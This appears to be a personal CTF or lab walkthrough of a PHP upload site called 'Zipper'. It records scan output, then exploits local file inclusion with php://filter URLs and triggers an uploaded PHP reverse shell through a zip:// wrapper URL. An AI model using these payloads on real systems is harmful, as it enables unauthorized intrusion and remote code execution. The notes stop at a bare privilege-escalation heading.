## NMAP 

```bash
# Nmap 7.94SVN scan initiated Tue Jul 16 15:01:21 2024 as: nmap -vv --reason -Pn -T4 -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /home/kali/... -oX /home/kali/... TARGET
Nmap scan report for TARGET
Host is up, received user-set (0.090s latency).
Scanned at 2024-07-16 15:01:22 EDT for 41s

Bug in http-security-headers: no string output.
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-referer-checker: 
| Spidering limited to: maxpagecount=30
|   https://cdnjs.cloudflare.com:443/ajax/libs/popper.js/1.13.0/umd/popper.min.js
|_  https://cdnjs.cloudflare.com:443/ajax/libs/twitter-bootstrap/4.0.0-beta.2/js/bootstrap.bundle.min.js
| http-headers: 
|   Date: Tue, 16 Jul 2024 19:01:32 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-feed: Couldn't find any feeds.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Failed to upload and execute a payload.
|   
|     Failed to upload and execute a payload.
|   
|     Couldn't find a file-type field.
|   
|_    Failed to upload and execute a payload.
| http-vhosts: 
|_128 names had status 200
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-title: Zipper
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=TARGET
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://TARGET:80/
|     Form id: 
|     Form action: 
|     
|     Path: http://TARGET:80/index.php?file=home
|     Form id: 
|_    Form action: 
|_http-date: Tue, 16 Jul 2024 19:01:28 GMT; -1s from local time.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; css: 1; php: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; css: 1; php: 1
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=TARGET
|     
|     Path: http://TARGET:80/index.php?file=home
|     Line number: 71
|     Comment: 
|         <!-- /.container -->
|     
|     Path: http://TARGET:80/style.css
|     Line number: 1
|     Comment: 
|         /* Move down content because we have a fixed navbar that is 3.5rem tall */
|     
|     Path: http://TARGET:80/index.php?file=home
|     Line number: 36
|     Comment: 
|         <!-- Main jumbotron for a primary marketing message or call to action -->
|     
|     Path: http://TARGET:80/index.php?file=home
|     Line number: 72
|     Comment: 
|         <!-- partial -->
|     
|     Path: http://TARGET:80/index.php?file=home
|     Line number: 13
|     Comment: 
|_        <!-- partial:index.partial.html -->
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
|_http-chrono: Request times for /; avg: 293.38ms; min: 252.51ms; max: 367.23ms
|_http-malware-host: Host appears to be clean
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-php-version: Logo query returned unknown hash 06b472e4a75b47a1d707d710a8d7b687
|_Credits query returned unknown hash 06b472e4a75b47a1d707d710a8d7b687
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-mobileversion-checker: No mobile version detected.
|_http-errors: Couldn't find any error pages.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-server-header: Apache/2.4.41 (Ubuntu)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 16 15:02:03 2024 -- 1 IP address (1 host up) scanned in 42.43 seconds

```

## CURL 

```bash
HTTP/1.1 200 OK
Date: Tue, 16 Jul 2024 19:01:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3151
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Zipper</title>
  <meta name="viewport" content="width=device-width, initial-scale=1", shrink-to-fit=no"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/css/bootstrap.min.css'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

</head>
<body>
<!-- partial:index.partial.html -->
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
  <a class="navbar-brand" href="#">
    <i class="fa fa-codepen" aria-hidden="true"></i>
    Zipper
  </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarsExampleDefault">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/index.php?file=home">Home <span class="sr-only">(current)</span></a>
      </li>
    </ul>
    <form class="form-inline my-2 my-lg-0">
      <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
      <button class="btn btn-outline-light my-2 my-sm-0" type="submit">Search</button>
    </form>
  </div>
</nav>

<!-- Main jumbotron for a primary marketing message or call to action -->
<div class="jumbotron">
  <div class="container">
    <h1 class="display-3">Welcome to Zipper!</h1>
    <p class="lead">
      With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression.
      Your uploaded files are encrypted and no one can access them.
    </p>
    <hr class="my-4">
    <div class="page-container row-12">
    		<h4 class="col-12 text-center mb-5">Create Zip File of Multiple Uploaded Files </h4>
    		<div class="row-8 form-container">
                        		    	<form action="" method="post" enctype="multipart/form-data">
				    <div class="input-group">
						<div class="input-group-prepend">
						    <input type="submit" class="btn btn-primary" value="Upload">
						</div>
						<div class="custom-file">
						    <input type="file" class="custom-file-input" name="img[]" multiple>
						    <label class="custom-file-label" >Choose File</label>
						</div>
					</div>
				</form>

    		</div>
		</div>
  </div>


</div>

<div class="container">
  <footer>
    <p>&copy; Zipper 2021</p>
  </footer>
</div> <!-- /.container -->
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/umd/popper.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/js/bootstrap.bundle.min.js'></script>
</body>
</html>


```

## Gobuster

Self Enumerate these!

Directories -> 

```bash
/uploads              (Status: 301) [Size: 320] [--> http://TARGET/uploads/]
/style                (Status: 200) [Size: 155]
/server-status        (Status: 403) [Size: 280]

```

Files ->

```bash
/index.php            (Status: 200) [Size: 3151]
/home.php             (Status: 200) [Size: 3151]
/.htaccess            (Status: 403) [Size: 280]
/style.css            (Status: 200) [Size: 155]
/.                    (Status: 200) [Size: 3151]
/upload.php           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htm                 (Status: 403) [Size: 280]
/.htpasswds           (Status: 403) [Size: 280]
/.htgroup             (Status: 403) [Size: 280]
/wp-forum.phps        (Status: 403) [Size: 280]
/.htaccess.bak        (Status: 403) [Size: 280]
/.htuser              (Status: 403) [Size: 280]
/.htc                 (Status: 403) [Size: 280]
/.ht                  (Status: 403) [Size: 280]

```
## Nikto

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          TARGET
+ Target Hostname:    TARGET
+ Target Port:        80
+ Start Time:         2024-07-16 15:01:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.

```

## Whatweb

```bash
WhatWeb report for http://TARGET:80
Status    : 200 OK
Title     : Zipper
IP        : TARGET
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], Bootstrap[4.0.0], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Script

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.41 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with
	HTML, CSS, and JS.

	Version      : 4.0.0
	Website     : https://getbootstrap.com/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Ubuntu Linux
	String       : Apache/2.4.41 (Ubuntu) (from server string)

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.


HTTP Headers:
	HTTP/1.1 200 OK
	Date: Tue, 16 Jul 2024 19:01:26 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 1314
	Connection: close
	Content-Type: text/html; charset=UTF-8



```
## Screenshot 

![Pasted image 20240716151114.png](Evidence/Pasted%20image%2020240716151114.png)

when you click on home a parameter appears 

![Pasted image 20240716152317.png](Evidence/Pasted%20image%2020240716152317.png)


```
php://filter/convert.base64-encode/resource=index
```

```
TARGET/index.php?file=php://filter/convert.base64-encode/resource=index
```

![Pasted image 20240716152440.png](Evidence/Pasted%20image%2020240716152440.png)

```
php://filter/convert.base64-encode/resource=home
```

```
TARGET/index.php?file=php://filter/convert.base64-encode/resource=home
```

![Pasted image 20240716152613.png](Evidence/Pasted%20image%2020240716152613.png)

```
php://filter/convert.base64-encode/resource=upload
```

```
TARGET/index.php?file=php://filter/convert.base64-encode/resource=upload
```

![Pasted image 20240716152823.png](Evidence/Pasted%20image%2020240716152823.png)

https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/

Uploaded the reverseshell called -> php-reverse-shell.php 

![Pasted image 20240716161245.png](Evidence/Pasted%20image%2020240716161245.png)

Then download the zip file which looks like this -> upload_1721161369.zip

then use this URL below ->

p.s. dont add the .php file extension at the end the webserver will do it for us 

paste URL into the URL bar and get reverse shell 

```
TARGET/index.php?file=zip://uploads/upload_1721158713.zip%23php-reverse-shell
```

Priv Esc
